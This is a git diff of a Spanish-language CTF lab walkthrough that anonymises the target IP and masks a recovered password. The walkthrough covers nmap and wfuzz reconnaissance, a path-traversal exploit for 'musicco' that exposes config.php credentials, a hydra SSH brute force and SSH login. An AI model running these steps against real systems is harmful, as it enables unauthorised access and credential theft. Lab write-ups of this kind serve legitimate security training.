@@ -3,11 +3,11 @@
 
 ```bash
 arp-scan -I eth0 --localnet
-192.168.200.28
+(IP-victima)
 ```
 
 ```bash
-nmap -p 22,80 -sS -sC -sV -n -Pn 192.168.200.28 -oN nmap
+nmap -p 22,80 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
 ```
 - 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
 - 80/tcp open  http    Apache httpd 2.4.56 ((Debian))
@@ -15,11 +15,11 @@ nmap -p 22,80 -sS -sC -sV -n -Pn 192.168.200.28 -oN nmap
 Dentro del puerto 80, efectivamente encontramos un servidor Apache. Haremos fuzzing para ver qué más encontramos.
 
 ```bash
-wfuzz --hc=404 -u http://192.168.200.28/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+wfuzz --hc=404 -u http://(IP-victima)/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 ```
 - /playlist
 
-Dentro de `http://192.168.200.28/playlist` encontramos una especie de reproductor de música, investigando un poco más encontramos que esto que vemos es un software llamado "musicco". Por lo tanto, buscaremos algún exploit para este software. Encontramos el siguiente exploit:
+Dentro de `http://(IP-victima)/playlist` encontramos una especie de reproductor de música, investigando un poco más encontramos que esto que vemos es un software llamado "musicco". Por lo tanto, buscaremos algún exploit para este software. Encontramos el siguiente exploit:
 
 [https://www.exploit-db.com/exploits/45830](https://www.exploit-db.com/exploits/45830)
 
@@ -32,7 +32,7 @@ http://localhost/[PATH]/?getAlbum&parent=[Directory]&album=Efe
 Para saber cuál es el directorio que tenemos que atacar usaremos wfuzz.
 
 ```bash
-wfuzz --hc=404 --hl=0 -u 'http://192.168.200.28/playlist/?getAlbum&parent=FUZZ&album=Efe' -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+wfuzz --hc=404 --hl=0 -u 'http://(IP-victima)/playlist/?getAlbum&parent=FUZZ&album=Efe' -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 ```
 - app
 - lib
@@ -41,7 +41,7 @@ wfuzz --hc=404 --hl=0 -u 'http://192.168.200.28/playlist/?getAlbum&parent=FUZZ&a
 
 Al ejecutar:
 ```bash
-http://192.168.200.28/playlist/?getAlbum&parent=app&album=Efe
+http://(IP-victima)/playlist/?getAlbum&parent=app&album=Efe
 ```
 
 Descargamos un archivo .zip. Al descomprimirlo encontramos un archivo llamado "config.php". Al leerlo encontramos unos posibles usuarios y contraseñas.
@@ -53,14 +53,14 @@ Descargamos un archivo .zip. Al descomprimirlo encontramos un archivo llamado "c
 Al intentar ingresar vía SSH no nos permite con ninguno de los dos usuarios. Así que al tener una contraseña que parece correcta intentaremos hacer fuerza bruta de usuarios con esa contraseña válida a ver qué pasa.
 
 ```bash
-hydra -L /home/kali/wordlists666/names.txt -p 'iL0v3Mu$1c' ssh://192.168.200.28
+hydra -L /home/kali/wordlists666/names.txt -p 'i********c' ssh://(IP-victima)
 ```
-- [22][ssh] host: 192.168.200.28   login: andy   password: iL0v3Mu$1c
+- [22][ssh] host: (IP-victima)   login: andy   password: i*********c
 
 Ahora ingresamos vía SSH:
 ```bash
-ssh andy@192.168.200.28
-Pass: iL0v3Mu$1c
+ssh andy@(IP-victima)
+Pass: i***********c
 ```
 
 ```bash
